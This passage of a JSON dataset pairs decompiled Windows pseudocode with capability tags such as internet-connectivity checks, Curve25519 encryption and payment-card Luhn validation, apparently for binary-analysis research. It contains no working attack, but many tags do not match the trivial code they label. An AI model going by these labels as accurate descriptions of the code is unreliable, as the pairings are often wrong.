        "decompiled_code": "\nuint __cdecl\nfcn.00410178(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x410223;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.0041024f;\n        uStack36 = *0x413728 ^ &fcn.00410178::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00410178::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.00406bbe();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.00410178::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 716
    },
    "0041123c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041123c(uint *param_1)\n\n{\n    *param_1 = 0x402f50;\n    if (param_1[2] != 0) {\n        fcn.0040802b(param_1[1]);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "0041057f": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041057f(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004064c4(0x411730, 0x10);\n    iVar1 = *(unaff_EBP + 0x10);\n    iVar2 = *(unaff_EBP + 8);\n    if (*(iVar1 + 4) < 0x81) {\n        iVar5 = *(iVar2 + 8);\n    }\n    else {\n        iVar5 = *(iVar2 + 8);\n    }\n    *(unaff_EBP + -0x1c) = iVar5;\n    iVar3 = fcn.00406bbe();\n    *(iVar3 + 0x90) = *(iVar3 + 0x90) + 1;\n    *(unaff_EBP + -4) = 0;\n    while (iVar5 != *(unaff_EBP + 0x14)) {\n        if ((iVar5 < 0) || (*(iVar1 + 4) <= iVar5)) {\n            fcn.00409669();\n        }\n        iVar3 = iVar5 * 8;\n        piVar4 = *(iVar1 + 8) + iVar3;\n        iVar5 = *piVar4;\n        *(unaff_EBP + -0x20) = iVar5;\n        *(unaff_EBP + -4) = 1;\n        if (piVar4[1] != 0) {\n            *(iVar2 + 8) = iVar5;\n            fcn.00411140(*(*(iVar1 + 8) + 4 + iVar3), iVar2, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = iVar5;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00410645();\n    if (iVar5 != *(unaff_EBP + 0x14)) {\n        fcn.00409669();\n    }\n    *(iVar2 + 8) = iVar5;\n    fcn.00406509();\n    return;\n}\n",
        "token_count": 560
    },
    "00410645": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00410645(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00406bbe();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.00406bbe();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "0041090d": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041090d(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.004103b6(*(unaff_EBP + -0x28));\n    iVar1 = fcn.00406bbe();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.00406bbe();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.0041038f(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.004106a5(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 380
    },
    "0040cc5e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040cc5e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x413728 ^ &stack0xfffffffc;\n    fcn.00408825(arg_10h);\n    var_14h = fcn.0040e6d4(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040dc4c(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040ccb7:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040ccf7;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040cce9:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040ccf7;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040cce9;\n        goto code_r0x0040ccb7;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040ccf7:\n    fcn.0040a174(unaff_EBX);\n    return;\n}\n",
        "token_count": 508
    },
    "0040cd06": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040cd06(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x413728 ^ &stack0xfffffffc;\n    fcn.00408825(arg_10h);\n    var_14h = fcn.0040e6d4(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040e190(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040cd5f:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040cd9f;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040cd91:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040cd9f;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040cd91;\n        goto code_r0x0040cd5f;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040cd9f:\n    fcn.0040a174(unaff_EBX);\n    return;\n}\n",
        "token_count": 508
    },
    "0040516e": {
        "rules": [
            "encrypt data using Curve25519/ee72fa54c57a4f96b956b5431c8943ad"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0040516e(uint param_1, uint param_2, int32_t param_3, uint param_4)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    bool bVar8;\n    uint16_t in_FPUControlWord;\n    uint16_t in_FPUStatusWord;\n    unkbyte10 extraout_ST0;\n    float10 fVar9;\n    uchar in_XMM0 [16];\n    uint64_t uVar10;\n    uint unaff_retaddr;\n    \n    uVar1 = SUB162(in_XMM0 >> 0x30, 0);\n    uVar2 = (uVar1 & 0x7fff) + 0xcfd0;\n    bVar8 = uVar2 == 0x10c5;\n    if (uVar2 < 0x10c6) {\n        iVar7 = (ROUND(*0x401ad0 * SUB168(in_XMM0, 0)) + 0x1c7610U & 0x3f) * 0x20;\n        return CONCAT44(iVar7, iVar7 + 0x401290);\n    }\n    if (uVar2 < 0x10c6) {\n        uVar4 = uVar1 & 0x7fff;\n        pinsrw(in_XMM0, uVar4, 3);\n        return CONCAT44(param_2, uVar4);\n    }\n    uVar10 = fcn.00405595();\n    uVar4 = uVar10 >> 0x20 & 0xffff0000 | in_FPUControlWord;\n    if (bVar8) {\n        if (((uVar10 & 0xfffff) == 0) && (param_3 == 0)) {\n            uVar3 = 1;\n        }\n        else {\n            uVar3 = fcn.0040557c();\n        }\n        if (*0x42a5a4 == 0) {\n            uVar6 = fcn.004056f7(uVar4, unaff_retaddr, param_3, param_4);\n            return CONCAT44(uVar4, uVar6);\n        }\n    }\n    else {\n        fVar9 = fcos(extraout_ST0);\n        uVar3 = uVar10 & 0xffff0000 | in_FPUStatusWord;\n        if ((in_FPUStatusWord & 0x400) != 0) {\n            do {\n                fVar9 = fVar9 - (fVar9 / *0x401b5a) * *0x401b5a;\n                uVar3 = uVar3 & 0xffff0000 | in_FPUStatusWord;\n            } while ((in_FPUStatusWord & 0x400) != 0);\n            fcos(fVar9);\n        }\n        if (*0x42a5a4 == 0) {\n            uVar5 = uVar3 & 0xffff0000 | in_FPUControlWord;\n            if (in_FPUControlWord != 0x27f) {\n                if (((in_FPUControlWord & 0x20) != 0) &&\n                   (uVar5 = uVar3 & 0xffff0000 | in_FPUStatusWord,  (in_FPUStatusWord & 0x20) != 0)) {\n                    uVar6 = fcn.004056f7(uVar4, unaff_retaddr, param_3, param_4);\n                    return CONCAT44(uVar4, uVar6);\n                }\n                uVar5 = uVar5 & 0xffff0020;\n            }\n            return CONCAT44(uVar4, uVar5);\n        }\n    }\n    return CONCAT44(uVar4, uVar3);\n}\n",
        "token_count": 849
    },
    "00405595": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00405595(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(param_2 + 4) & 0x7ff00000;\n    if (uVar1 != 0x7ff00000) {\n        return uVar1;\n    }\n    return *(param_2 + 4);\n}\n",
        "token_count": 91
    },
    "004104b0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004104b0(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x402f34;\n    fcn.0041123c();\n    if ((arg_8h & 1) != 0) {\n        fcn.004048a2();\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "0041125f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041125f(uint32_t arg_8h)\n\n{\n    fcn.0041123c();\n    if ((arg_8h & 1) != 0) {\n        fcn.004048a2();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00411290": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411290(uint32_t arg_8h)\n\n{\n    fcn.00411280();\n    if ((arg_8h & 1) != 0) {\n        fcn.004048a2();\n    }\n    return;\n}\n",
        "token_count": 58
    },
    "004038ee": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.004038ee(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    float10 fVar1;\n    \n    fVar1 = fcn.00404870(arg_8h, arg_ch, arg_10h, arg_14h);\n    return fVar1;\n}\n",
        "token_count": 78
    },
    "00403921": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403921(void)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + -0x3910cb1f;\n    return;\n}\n",
        "token_count": 45
    },
    "00403928": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403928(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + param_1;\n    return;\n}\n",
        "token_count": 47
    },
    "0040392b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040392b(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + param_1;\n    return;\n}\n",
        "token_count": 48
    },
    "00403b22": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403b22(void)\n\n{\n    uint var_4h;\n    \n    *0x43fcf4 = *0x43fcf4 + 0x300c;\n    return;\n}\n",
        "token_count": 47
    },
    "0040445b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040445b(void)\n\n{\n    int32_t in_EAX;\n    \n    if (0xf < *(in_EAX + 0x18)) {\n        return *(in_EAX + 4);\n    }\n    return in_EAX + 4;\n}\n",
        "token_count": 62
    },
    "00404d41": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404d41(uint arg_8h)\n\n{\n    fcn.00404c15(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "00407231": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407231(uint arg_8h, uint arg_ch)\n\n{\n    uint var_2c8h;\n    \n    fcn.00407264(arg_8h, arg_ch);\n    fcn.00405300();\n    fcn.004070e3();\n    return;\n}\n",
        "token_count": 67
    },
    "0040945f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00409473)\n// WARNING: Removing unreachable block (ram,0x00409479)\n// WARNING: Removing unreachable block (ram,0x0040947b)\n\nvoid fcn.0040945f(void)\n\n{\n    return;\n}\n",
        "token_count": 62
    },
    "00411389": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00411389(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004064c4(0x411888, 0xc);\n    fcn.004059cd(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x43ff3c;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x43ff38;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x004113cd;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.0040802b(arg_8h_00);\ncode_r0x004113cd:\n        fcn.0040802b(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004113f0();\n    fcn.00406509();\n    return;\n}\n",
        "token_count": 392
    }
}